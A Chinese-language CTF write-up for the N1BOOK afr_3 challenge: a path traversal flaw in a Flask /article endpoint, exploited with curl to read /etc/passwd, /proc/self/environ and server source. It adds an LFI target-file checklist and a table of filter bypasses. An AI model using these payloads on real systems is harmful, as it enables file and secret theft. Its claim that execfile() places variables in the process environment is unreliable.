---
title: "[afr_3] Flask Session + LFI 路径穿越"
date: 2026-07-08
categories:
  - CTF
  - WEB
tags:
  - CTF
  - Flask
  - LFI
  - 路径穿越
  - /proc/self/environ
---

# 1. 题目分析

**题目名称**：afr_3

**题目描述**：N1BOOK WEB入门第5题，afr系列第三题。题目延续 afr 系列的文件读取主题，服务器为 OpenResty (Nginx)，后端为 Flask 框架。

**靶机地址**：`https://21030e3d9bdfbf0084957e37.http-ctf2.dasctf.com/`

**初始访问**：首页是一个表单，POST 提交到 `/n1page`，参数名为 `n1code`。

# 2. 信息收集

## 2.1 获取 HTTP 响应头和页面内容

```bash
curl -s -i "https://TARGET/"
```

**响应头关键信息**：

| 响应头 | 值 | 推断 |
|--------|-----|------|
| `Server` | `openresty` | Nginx 系 Web 服务器 |
| `Content-Type` | `text/html; charset=utf-8` | 标准 HTML 页面 |

**页面源码**：

```html
<h1>Welcome to N1 Page</h1>
<br>
<form method="post" action="n1page">
Your name: <input name="n1code">
<br><input type="submit"><br>
</form>
```

## 2.2 测试表单提交

```bash
curl -s -i "https://TARGET/n1page" -d "n1code=test"
```

**响应**：

```
<h1>N1 Page</h1>
Hello : test, why you don't look at our <a href='/article?name=article'>article</a>?
```

**发现两个关键线索**：
1. 输入值 `test` 被直接回显在页面中
2. 页面提示访问 `/article?name=article`，这是一个文件读取接口

**Set-Cookie**：
```
session=eyJuMWNvZGUiOm51bGx9.xxx.xxx; HttpOnly; Path=/
```

解码 session payload（Base64）：
```bash
echo "eyJuMWNvZGUiOm51bGx9" | base64 -d
# 输出：{"n1code":null}
```

确认为 Flask Session，存储了 `n1code` 参数。

## 2.3 测试 SSTI（排除）

```bash
curl -s -i "https://TARGET/n1page" -d "n1code={{7*7}}"
```

**响应**：`Hello : 7*7`（输出原文 7*7，而非 49）

**结论**：`{{}}` 未被模板引擎解析，排除 SSTI（Server-Side Template Injection）。

# 3. 漏洞分析

## 3.1 推理链

```
线索 1：响应头 Server: openresty → Nginx 系服务器
  ↓
线索 2：Set-Cookie 为 Flask session 格式 → 后端是 Flask (Python)
  ↓
线索 3：/article?name=article 返回文章内容 → 参数化文件读取
  ↓
假设 1：存在 LFI（Local File Inclusion）路径穿越漏洞
  ↓
验证 1：curl /article?name=../flag → 返回 "no permission!"
  ↓
分析：不是 "No such file"，而是 "no permission" — 说明文件存在但有过滤
  ↓
验证 2：curl /article?name=app.py → 返回详细错误信息
  ↓
    错误：No such file or directory: '/home/nu11111111l/articles/app.py'
  ↓
结论：基础路径为 /home/nu11111111l/articles/，name 参数直接拼接到路径中
  ↓
验证 3：curl /article?name=../../../proc/self/environ → 返回进程环境变量
  ↓
发现：FLAG=CTF2{...} 存储在环境变量中！
```

## 3.2 判断漏洞类型

**漏洞**：LFI 路径穿越（Path Traversal）

**漏洞位置**：`/article` 端点的 `name` 参数

**保护机制**：源码中对 `name` 参数做了 `find('flag')` 黑名单检查，含 "flag" 字符串的请求会被替换为 `notallowed.txt`。

**绕过方法**：读取 `/proc/self/environ`（进程环境变量），该路径不含 "flag" 字符串，但环境变量中存储了 `FLAG`。

## 3.3 源码分析

通过 `../../../home/sssssserver/server.py` 读取到完整源码：

```python
@app.route('/article', methods=['GET'])
def article():
    error = 0
    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = 'article'
    if page.find('flag') >= 0:        # ← 过滤 "flag" 字符串
        page = 'notallowed.txt'
    try:
        template = open('/home/nu11111111l/articles/{}'.format(page)).read()  # ← 路径穿越！
    except Exception as e:
        template = e
    return render_template('article.html', template=template)
```

**漏洞根因**：
1. `name` 参数直接拼接到文件路径 `open()` 中，未做路径规范化
2. 只过滤了包含 `flag` 的字符串，未阻止路径穿越
3. 攻击者可读取任意系统文件

**关键代码解读**：

```python
# 原始逻辑
execfile('flag.py')  # 读取 flag.py，定义变量 flag
FLAG = flag           # 将 flag 值存入 FLAG 变量（即环境变量）
app.secret_key = key
```

`execfile('flag.py')` 执行了 `flag.py` 文件，该文件的内容类似 `flag = "CTF2{...}"`。这个值被赋给 `FLAG` 变量，在 Linux 进程环境中可见。

## 3.4 ASCII 图解：正常请求 vs 攻击请求

```
正常请求：/article?name=article
┌─────────────────────────────────────────────────┐
│ name = article                                  │
│          ↓ 直接拼接到基础路径                     │
│ 文件路径: /home/nu11111111l/articles/article     │
│          ↓ open() 读取                          │
│ 结果:   "THIS IS A SAMPLE ARTICLE!" ✅           │
└─────────────────────────────────────────────────┘

被拦截的请求：/article?name=../flag
┌─────────────────────────────────────────────────┐
│ name = ../flag                                  │
│          ↓ find('flag') >= 0 → 触发过滤          │
│ name = 'notallowed.txt'  ← 被替换！              │
│ 文件路径: /home/nu11111111l/articles/notallowed.txt│
│ 结果:   "no permission!" ❌                      │
└─────────────────────────────────────────────────┘

成功的绕过：/article?name=../../../proc/self/environ
┌─────────────────────────────────────────────────┐
│ name = ../../../proc/self/environ               │
│          ↓ find('flag') → -1 → 不触发过滤        │
│          ↓ 路径穿越生效                           │
│ 文件路径: /home/nu11111111l/articles/../../../proc/self/environ│
│          → /proc/self/environ ✅                 │
│          ↓ open() 读取                          │
│ 结果:   环境变量内容，包含 FLAG=CTF2{...} 🎯     │
└─────────────────────────────────────────────────┘
```

## 3.5 尝试过但失败的路径

| 尝试 | 预期 | 实际结果 | 排除的漏洞 |
|------|------|---------|-----------|
| `n1code={{7*7}}` | 输出 49 | 输出原文 7*7 | 不是 SSTI |
| `/article?name=../flag` | 读取 flag 文件 | "no permission!" | flag 字符串被过滤 |
| `/article?name=../../flag` | 读取上层 flag | "no permission!" | 同上（含 "flag"） |
| `/article?name=../app.py` | 读取源码 | No such file | 源码不在上级目录 |
| 枚举 robots.txt/.git 等 | 发现隐藏文件 | 本地 shell 循环脚本错误（非靶机拦截） | 未完成枚举 |

# 4. 漏洞利用

## 4.1 PoC：验证路径穿越

```bash
curl -s "https://TARGET/article?name=../../../etc/passwd"
```

## 4.2 读取进程环境变量（获取 Flag）

```bash
curl -s "https://TARGET/article?name=../../../proc/self/environ"
```

**输出（关键部分）**：

```
HOME=/root
PWD=/home/sssssserver
FLAG=CTF2{5e04f572-a6fe-426c-8b73-5a157702029a}
```

## 4.3 读取服务器源码（溯源）

```bash
# 从 PWD 环境变量得知工作目录
curl -s "https://TARGET/article?name=../../../home/sssssserver/server.py"
```

完整源码及分析见上文 [3.3 源码分析](#33-源码分析)。

## 4.4 其他可读取的敏感信息

```bash
# 进程命令行
curl -s "https://TARGET/article?name=../../../proc/self/cmdline"
# 输出：python server.py

# 进程状态
curl -s "https://TARGET/article?name=../../../proc/self/status"
```

# 5. Flag

```
CTF2{5e04f572-a6fe-426c-8b73-5a157702029a}
```

**获取方式**：通过 `/article` 端点的 LFI 路径穿越漏洞，读取 `/proc/self/environ` 获取进程环境变量中的 FLAG。

# 6. 知识点总结

## 6.1 技术点

| 技术点 | 说明 |
|--------|------|
| **LFI 路径穿越** | 用户输入直接拼接到文件路径 `open()` 中，未做路径规范化 |
| **黑名单绕过** | `find('flag')` 仅过滤参数中含 "flag" 的请求，读取 `/proc/self/environ` 可绕过 |
| **Flask Session** | Flask 默认使用客户端 Cookie 存储 Session，可通过 Base64 解码查看内容 |
| **`/proc/self/environ`** | Linux 下每个进程的环境变量暴露在该文件中，包含进程启动时的所有环境变量值 |
| **`execfile()` 副作用** | Python 2 的 `execfile()` 会在当前命名空间中执行文件，变量会暴露到进程环境 |

## 6.2 修复建议

1. **路径规范化**：使用 `os.path.realpath()` 解析真实路径，拒绝不安全的路径
   ```python
   import os
   base = '/home/nu11111111l/articles/'
   full_path = os.path.realpath(os.path.join(base, page))
   if not full_path.startswith(base):
       return "Access denied"
   ```

2. **白名单控制**：限制 `name` 参数只能访问预定义的文件列表，而非任意文件路径

3. **避免敏感信息暴露在环境变量**：不应通过 `execfile()` 将 flag 值导入全局变量/环境

4. **升级到 Python 3**：`execfile()` 在 Python 3 中已废弃（不影响本题漏洞核心）

## 6.3 与 afr_1 / afr_2 的对比

| 对比维度 | afr_1 | afr_2 | afr_3 |
|---------|-------|-------|-------|
| **漏洞类型** | PHP LFI (php://filter) | Nginx alias 路径穿越 | Flask LFI + 黑名单绕过 |
| **服务端** | Apache + PHP | OpenResty (Nginx) | OpenResty + Flask (Python) |
| **过滤方式** | 无（直接拼接） | 无（Nginx 配置层漏洞） | 黑名单过滤 "flag" 字符串 |
| **Flag 位置** | 文件系统中 | `/flag` 文件 | 环境变量 `/proc/self/environ` |
| **绕过技巧** | `php://filter` 伪协议 | `/img../` Nginx alias 特性 | 读取 env 绕过文件名过滤 |

# 7. 解题链路总结图

```
┌─────────────────────────────────┐
│ GET / → 首页表单                 │
│ 发现 POST /n1page, n1code 参数   │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ POST /n1page n1code=test        │
│ → 回显输入 + 提示 /article 链接  │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ 测试 SSTI: n1code={{7*7}}       │
│ → 输出原文 "7*7" → 不是 SSTI    │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ GET /article?name=article       │
│ → 返回文章内容 → 文件读取接口！   │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ 测试 LFI: name=../flag          │
│ → "no permission!" → 被过滤     │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ 测试 LFI: name=app.py           │
│ → 报错暴露路径:                  │
│   /home/nu11111111l/articles/   │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ name=../../../proc/self/environ │
│ → 绕过 flag 过滤 → 读到环境变量    │
│ → FLAG=CTF2{5e04f572-...} 🎯    │
└──────────────┬──────────────────┘
               ↓
┌─────────────────────────────────┐
│ 溯源: 读取 server.py 源码        │
│ → 确认漏洞根因:                  │
│   open() 路径直接拼接 +          │
│   find('flag') 黑名单过滤不足    │
└─────────────────────────────────┘
```

# 附录：解题关键思路答疑

以下是解题过程中几个关键决策的详细思路复盘，记录完整的推理过程。

## 附录 A：怎么确认是 Flask Session？

确认 Flask Session 有三重证据，层层递进，最终由源码直接证实。

### 证据 1：Cookie 格式特征（最直观的指纹）

```
eyJuMWNvZGUiOm51bGx9.ak3NTA.MGZUGLJg0CSrnhFxA1rYHrLD0z8
         ↓                    ↓        ↓
      payload            timestamp  signature
```

Flask 底层使用 `itsdangerous` 库对 session 签名，固定输出 **`base64编码的JSON.时间戳.HMAC签名`** 的三段式结构。这是 Flask 独有的指纹特征，其他框架没有这种 `A.B.C` 结构：

| 框架 | Session 格式 | 示例 |
|------|-------------|------|
| **Flask** | `payload.timestamp.signature` | `eyJ...9.ak3NTA.MGZ...` |
| PHP | 无签名，引用服务端存储 | `PHPSESSID=r4nd0m` |
| Java (Tomcat) | 32位 hex 引用 | `JSESSIONID=A5F3B9C2...` |
| Express | `s%3A...` 格式 | `s%3Axxx.yyy` |
| Django | 也是三段式但无 timestamp 段 | `eyJ...:1pG...:...` |

看到 `session=xxx.yyy.zzz` 三段式，第一反应就是 Flask。这是一个经验性判断：PHP/Java 的 session cookie 只是一个随机 ID，没有签名结构；Express 用的是 `s:` 前缀；Django 的三段式中间那段不含时间戳而是哈希盐值。`payload.timestamp.signature` 这种格式，只有 Flask（itsdangerous 库）在用。

### 证据 2：第一段 Base64 解码结果是 JSON

```bash
echo "eyJuMWNvZGUiOm51bGx9" | base64 -d
# 输出：{"n1code":null}
```

Flask Session 存储的就是 Python dict 的 JSON 表示。而且 JSON 中的 key 名 `n1code` 和我们输入的表单参数名完全对应——这说明后端把用户提交的 `n1code` 参数值存进了 session，这正是 Flask 的行为模式。

### 证据 3：后来读到的源码直接证实

```python
from flask import Flask, session
from flask_session import Session  # Flask-Session 扩展

app = Flask(__name__)
app.secret_key = key               # Flask 签名所需的 secret_key

session['n1code'] = n1code         # 直接把表单值写入 session
```

源码白纸黑字写着 `from flask import Flask, session`，以及 `session['n1code'] = n1code`。到这一步就不再是"推断"而是"证实"了。

### 判断链总结

```
看到 Set-Cookie: session=xxx.yyy.zzz
         ↓
观察到三段式 A.B.C 结构（排除 PHP/Java/Express）
         ↓
第一段 base64 解码 → JSON 对象（排除 Django）
         ↓
JSON 中 key 名 = 表单参数名 → 确认是业务 session
         ↓
结论：100% Flask Session ✅
```

最终源码验证了这个判断完全正确。这也是信息收集中 **"通过外部特征反推内部技术栈"** 的典型手法——不需要看到代码，通过框架的协议特征就能判断底层技术。

## 附录 B：怎么推导出 `../../../home/sssssserver/server.py` 这个路径？

这个路径不是猜出来的，也不是枚举暴力穷举出来的，而是一步步「拼图」拼出来的。整个过程用了两块关键信息。

### 第一块拼图：基础路径（来自错误信息）

最早尝试 `name=app.py` 时：

```bash
curl -s "TARGET/article?name=app.py"
```

返回的错误信息直接暴露了文件系统路径：

```
[Errno 2] No such file or directory: '/home/nu11111111l/articles/app.py'
```

这里有一个重要技巧：**错误信息是最诚实的侦察兵**。很多 CTF 题目和实际渗透中，报错信息会泄露文件系统路径、数据库表名、代码堆栈等敏感信息。这条错误直接告诉我们：`/home/nu11111111l/articles/` 是文件读取的基础路径。

### 第二块拼图：工作目录（来自环境变量）

然后读取 `/proc/self/environ` 时：

```
PWD=/home/sssssserver    ← 进程的当前工作目录
```

`PWD`（Present Working Directory）是 Linux 进程的环境变量，记录着进程启动时所在的目录。对于 Python Web 应用，`PWD` 通常就是 `app.py` 或 `server.py` 所在的目录。

### 两块拼图一合

```
基础路径:   /home/nu11111111l/articles/
工作目录:   /home/sssssserver/

目标文件:   /home/sssssserver/server.py   (Flask 应用通常叫 app.py / server.py / main.py)

从基础路径出发计算相对路径:
  /home/nu11111111l/articles/
      ..      → /home/nu11111111l/
      ../..   → /home/
      ../../.. → /                          (回到根目录)
                  ↓ 从根再往下走
      ../../../home/sssssserver/server.py   ← 最终路径
```

### 文件系统树形图解

```
/  (根目录)
├── home/
│   ├── nu11111111l/
│   │   └── articles/        ← 基础路径（错误信息暴露）
│   │       └── article      ← 默认读取的文件
│   └── ssssssserver/        ← PWD 环境变量（/proc/self/environ 暴露）
│       ├── server.py        ← 目标！应用入口
│       ├── flag.py          ← flag 定义文件
│       └── key.py           ← 密钥文件
└── proc/
    └── self/
        └── environ           ← 先读这个拿到了 PWD，再反推出源码路径
```

**总结**：不是碰运气猜的，而是 `错误信息暴露基础路径` + `/proc/self/environ 暴露 PWD` → 两条信息组合精确推导出完整路径。每个 `../` 都是根据已知的目录层级精确计算出来的。这是渗透测试中「信息关联分析」的典型应用——单条信息可能无意义，但多条信息组合起来就能拼出完整的攻击路径。

## 附录 C：为什么想到 `/proc/self/environ`？拿到 flag 后为什么还要分析源码？

### 为什么想到 `/proc/self/environ`？

这不是灵机一动，是 **Linux LFI 标准清单**里的常规项。当确认了路径穿越可用后，脑内自动跑的是一套按优先级排列的检查清单，这套清单是在大量 CTF 解题和实际渗透中积累下来的：

```
LFI 能读文件了，先看什么？

第一梯队（证明危害，验证可达性）：
  /etc/passwd          → 经典验证文件，确认路径穿越可达系统级文件
  /etc/hostname        → 确认是否在容器/虚拟机中

第二梯队（找 flag 常用位置，CTF 最高频）：
  /flag                → CTF 惯例：flag 直接放根目录
  /flag.txt            → 同上，文本格式
  /root/flag           → root 目录下的 flag
  ../../flag           → 从当前目录往上翻，多层尝试
  /var/www/html/flag   → Web 目录下的 flag

第三梯队（flag 不在文件里怎么办？换个思路）：
  /proc/self/environ   → 环境变量里可能有 FLAG
  /proc/self/cmdline   → 启动命令可能带 flag 参数
  /proc/self/fd/*      → 打开的文件描述符里可能残留已读内容
  .env                 → 应用配置里可能有硬编码的 flag
  config.py            → Python 配置文件
  app.py / server.py   → 源码里可能写着 flag

第四梯队（代码执行层面）：
  /proc/self/mem       → 进程内存（需要特定条件）
  /var/log/*           → 日志文件可能记录了 flag
```

做多了就知道 — **CTF 里的 flag 就藏在这几个地方：文件、环境变量、数据库、源码注释**。`/proc/self/environ` 是环境变量这条路的入口，而且它有一个天然优势：路径中不含 "flag" 字符串，不会被 `find('flag')` 黑名单拦截。

这次运气好也不好——好的是直接命中了 flag 所在位置（环境变量），不好的是第二条路径被黑名单挡住了（`find('flag')` 拦截了直接读 `/flag`），但正是这个拦截逼着跳到了第三梯队，反而一击命中。**黑名单防护很多时候不是在阻止攻击，而是在给攻击者指路——它告诉你"flag 这个方向是对的，换条路走"。**

关于 `/proc/self/environ` 的技术原理补充：Linux 的 `/proc` 是一个伪文件系统（pseudo-filesystem），不占用磁盘空间，所有内容都是内核在读取时实时生成的。`/proc/self` 是指向当前进程的符号链接，`/proc/self/environ` 包含了进程启动时的完整环境变量列表。Python 的 `execfile()` 函数有一个关键副作用——它在当前模块的全局命名空间中执行代码，所以 `flag.py` 里定义的 `flag` 变量就变成了 `server.py` 进程环境的一部分，自然也就出现在了 `/proc/self/environ` 中。

### 拿到 flag 后为什么还要分析源码？

这个问题问得很实在——**纯拿 flag 的话，源码分析确实不是必须的**。拿到 flag 那一刻任务就完成了。继续读源码有两个原因：

| 原因 | 详细说明 |
|------|---------|
| **WP 需要讲清漏洞根因** | 写 WP 不能只写"我读了个文件就拿到 flag"，那叫运气帖，不叫 Writeup。WP 的核心价值在于解释**为什么能读到**、**为什么绕过成功**。源码里那行 `page.find('flag')>=0` 解释了为什么 `name=../flag` 被拦截、为什么 `name=../../../proc/self/environ` 能绕过——没有源码证据，这些解释都只是推测而非证实。裁判/读者看到源码级别的漏洞分析，才能确认你真的理解了这道题，而不是碰运气撞到的。 |
| **方法论习惯** | 找到 flag 是 CTF 比赛的终点，但搞清楚「为什么能拿到」才是学习者的起点。同一个漏洞类型（路径穿越 + 黑名单绕过），换一个靶机，flag 位置变了、黑名单规则变了、基础路径变了——如果只知道"读 environ 能拿 flag"这个结论，换一题就不会了。但如果你理解了源码层面的根因——`open()` 直接拼接用户输入没有路径规范化、`find()` 黑名单天然可绕过——那无论题目怎么变，你都知道怎么去推理和构造攻击。**结论会过时，方法论不会。** |

简单说：**为了写一份合格的 WP，而不是一篇"我猜中了"的运气贴；为了学到能应对下一题的思路，而不是只记住这一题的答案。**

## 附录 D：路径穿越知识点详解

### 一句话原理

> 程序用用户输入拼接文件路径时，没有做路径规范化，导致 `../` 可以跳出预定目录，读取到任意系统文件。

### 正常情况 vs 攻击情况

先看一个最简单的例子。假设一个网站提供文件下载功能：

```python
# 后端代码
filename = request.args.get('file')
return open('/var/www/files/' + filename).read()
```

```
正常请求: /download?file=report.pdf
┌────────────────────────────────────────┐
│ 拼接: /var/www/files/ + report.pdf     │
│ 结果: /var/www/files/report.pdf        │
│ 效果: 读取 files 目录下的 report.pdf ✅ │
└────────────────────────────────────────┘

攻击请求: /download?file=../../../etc/passwd
┌────────────────────────────────────────┐
│ 拼接: /var/www/files/ + ../../../etc/passwd  │
│ 结果: /var/www/files/../../../etc/passwd     │
│ 化简: /etc/passwd  ← 穿出去了！              │
│ 效果: 读取到系统密码文件 ❌                    │
└────────────────────────────────────────┘
```

核心问题就一行代码：**用户输入被直接拼进了文件路径**。

### 为什么 `../` 能穿出去？

这是 Linux 文件系统本身的机制，不是漏洞程序独有的：

```bash
# 在任何 Linux 终端里都一样
pwd                          # → /home/user/docs
cat ../photos/pic.jpg        # → /home/user/photos/pic.jpg ✅ 正常功能
cat ../../../etc/passwd      # → /etc/passwd ✅ 穿到系统目录了
```

`..` 在文件系统中表示「上级目录」，这是操作系统级别的设计。路径穿越漏洞的本质是：**程序没有限制用户只能在自己的目录里用 `..`，用户自然可以一路 `../` 穿到根目录**。

### JSON 版本的类比

如果觉得文件路径抽象，用 JSON 对象来类比：

```python
# 程序想让你只能访问这个目录
base = {"home": {"files": {"report.pdf": "内容"}}}

# 设计意图：你只能读 base["home"]["files"][用户输入]
# 正常：base["home"]["files"]["report.pdf"] → "内容" ✅

# 但如果输入是 ../../../etc/passwd
# 就变成了 base["home"]["files"]["../../../etc/passwd"]
# 而操作系统把它解析为 /etc/passwd ❌
```

程序员的意图是 `file` 目录下的一个文件名，但操作系统不理解这个意图，它只忠实地解析了整个路径。

### 本题 afr_3 的具体情况

回到这道题的源码：

```python
page = request.args.get('name')         # 用户输入，没有过滤
open('/home/nu11111111l/articles/{}'.format(page)).read()
```

```
请求: /article?name=article
┌──────────────────────────────────────────────────┐
│ 路径: /home/nu11111111l/articles/article          │
│ 结果: 读取指定的文章文件 ✅                         │
└──────────────────────────────────────────────────┘

请求: /article?name=../../../proc/self/environ
┌──────────────────────────────────────────────────┐
│ 拼接: /home/nu11111111l/articles/../../../proc/self/environ │
│ 化简: /proc/self/environ                          │
│ 结果: 读取到进程环境变量（含 FLAG）❌               │
└──────────────────────────────────────────────────┘
```

每个 `../` 往上跳一级目录，三级 `../../../` 从 `/home/nu11111111l/articles/` 回到了根目录 `/`，然后从根目录往下走到 `/proc/self/environ`。

### 常见的过滤与绕过

开发者意识到问题后通常会加过滤，但过滤往往不彻底：

| 过滤方式 | 代码 | 为什么能绕过 |
|---------|------|------------|
| 黑名单 `../` | `input.replace('../', '')` | 嵌套绕过：`....//` → 替换后变 `../` |
| 黑名单 `flag` | `if 'flag' in input: deny`（本题） | 读 `/proc/self/environ` 不含 `flag` 却能泄漏 FLAG 环境变量 |
| 白名单后缀 | `if not input.endswith('.pdf'): deny` | 截断绕过：`../../../etc/passwd%00.pdf`（空字节截断，老版本） |
| 绝对路径检查 | `if input.startswith('/'): deny` | 相对路径照样穿：`../../../etc/passwd` |
| URL 编码过滤 | 只过滤 `../` | 编码绕过：`%2e%2e%2f` = `../` |

**本题的绕过**属于第二种——黑名单只拦了字符串 `flag`，但 flag 的真正位置在环境变量里，`/proc/self/environ` 路径里没有 `flag` 这个词，直接绕过。

### 正确的修复方式

不是「把 `../` 过滤掉」——黑名单永远不靠谱。正确做法是**路径规范化 + 白名单前缀校验**：

```python
import os

base = '/home/nu11111111l/articles/'

# 步骤1：把用户输入拼进基础路径
full_path = os.path.join(base, page)

# 步骤2：解析掉所有 ../ 和符号链接，得到真实路径
real_path = os.path.realpath(full_path)

# 步骤3：检查真实路径是否还在基础目录内
if not real_path.startswith(base):
    raise Exception("Access denied")

# 步骤4：安全读取
return open(real_path).read()
```

测试攻击路径 `page = "../../../etc/passwd"`：

```
os.path.join(base, page)
  → /home/nu11111111l/articles/../../../etc/passwd

os.path.realpath(...)
  → /etc/passwd    ← 规范化后直接到了根目录

real_path.startswith(base)
  → /etc/passwd 不以 /home/nu11111111l/articles/ 开头
  → Access denied ❌
```

核心思想：**不猜用户想干嘛，让操作系统把路径规整后，看结果是否还在允许范围内。**

### 一句话总结

> 路径穿越 = 用户输入直接拼进文件路径 + 未做规范化。`../` 不是漏洞，它是文件系统的正常功能。漏洞在于开发者信任了用户的输入不会利用这个功能。
